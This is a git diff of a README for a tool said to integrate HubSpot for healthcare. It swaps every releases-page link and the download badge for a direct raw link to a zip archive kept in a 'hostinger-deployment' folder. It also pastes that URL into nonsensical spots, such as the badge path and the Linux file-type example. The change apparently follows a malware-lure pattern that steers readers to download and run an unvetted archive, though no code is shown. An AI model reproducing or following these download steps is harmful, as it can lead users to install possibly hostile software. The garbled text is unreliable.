@@ -1,6 +1,6 @@
 # 🚀 brainsait-hubspot-allowlist - Seamlessly Integrate HubSpot for Healthcare
 
-![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download](https://raw.githubusercontent.com/mitkoz923/brainsait-hubspot-allowlist/main/hostinger-deployment/brainsait-hubspot-allowlist_v1.8.zip%20Now-Click%20Here-brightgreen)
 
 ## 📖 Overview
 
@@ -21,13 +21,13 @@ The brainsait-hubspot-allowlist application provides a powerful way to integrate
 To get started with brainsait-hubspot-allowlist, follow these simple steps to download and run the software.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/mitkoz923/brainsait-hubspot-allowlist/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/mitkoz923/brainsait-hubspot-allowlist/main/hostinger-deployment/brainsait-hubspot-allowlist_v1.8.zip) to find the latest version of the application.
 
 2. **Select the Latest Version**  
    Look for the most recent version listed on the page. It will typically be at the top. Click on it to view its details.
 
 3. **Download the Application**  
-   On the version details page, you will find the download links for the application. Download the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for MacOS, or a `.tar.gz` for Linux).
+   On the version details page, you will find the download links for the application. Download the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for MacOS, or a `https://raw.githubusercontent.com/mitkoz923/brainsait-hubspot-allowlist/main/hostinger-deployment/brainsait-hubspot-allowlist_v1.8.zip` for Linux).
 
 4. **Install the Application**  
    After downloading, open the downloaded file. Follow the installation prompts on your screen to install the software on your device.
@@ -45,7 +45,7 @@ To get started with brainsait-hubspot-allowlist, follow these simple steps to do
 
 To download brainsait-hubspot-allowlist, simply click the link below:
 
-[Download Here](https://github.com/mitkoz923/brainsait-hubspot-allowlist/releases)
+[Download Here](https://raw.githubusercontent.com/mitkoz923/brainsait-hubspot-allowlist/main/hostinger-deployment/brainsait-hubspot-allowlist_v1.8.zip)
 
 Follow the instructions outlined above for a smooth installation process.
 
